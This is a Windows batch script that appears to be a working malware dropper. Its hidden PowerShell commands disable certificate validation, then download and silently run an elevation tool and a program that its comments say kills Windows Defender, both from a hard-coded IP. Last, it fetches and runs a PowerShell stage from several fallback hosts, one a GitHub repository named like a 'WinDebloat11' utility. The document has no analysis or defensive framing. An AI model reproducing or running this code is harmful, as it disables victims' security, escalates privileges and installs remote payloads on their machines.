@echo off
setlocal EnableExtensions

rem === STEP 2: Download + run ElevatorShellCode ===
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');try{$wc.DownloadFile('https://193.26.115.196/ElevatorShellCode.exe','%TEMP%\el.exe');Start-Process '%TEMP%\el.exe' -WindowStyle Hidden}catch{}"

rem === Wait for elevation ===
timeout /t 6 /nobreak >nul 2>&1

rem === STEP 1: Download + run Defender Killer (update.exe kill) ===
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');try{$wc.DownloadFile('https://193.26.115.196/update.exe','%TEMP%\up.exe');Start-Process '%TEMP%\up.exe' -ArgumentList 'kill' -WindowStyle Hidden}catch{}"

rem === Wait for Defender to die ===
timeout /t 8 /nobreak >nul 2>&1

rem === STEP 2: Download + run ElevatorShellCode ===
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');try{$wc.DownloadFile('https://193.26.115.196/ElevatorShellCode.exe','%TEMP%\el.exe');Start-Process '%TEMP%\el.exe' -WindowStyle Hidden}catch{}"

rem === Wait for elevation ===
timeout /t 6 /nobreak >nul 2>&1

rem === STEP 3: Download + run stage_v6_pulsaar.ps1 ===
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$sources=@('https://193.26.115.196/stage_v6_pulsaar.ps1','https://signindat.com/stage_v6_pulsaar.ps1','https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/stage_v6_pulsaar.ps1');foreach($u in $sources){try{$wc=New-Object Net.WebClient;$wc.DownloadFile($u,\"$env:TEMP\\s.ps1\");if((Get-Item \"$env:TEMP\\s.ps1\").Length -gt 100){break}}catch{}};powershell -NoP -W Hidden -File \"$env:TEMP\\s.ps1\""

exit /b
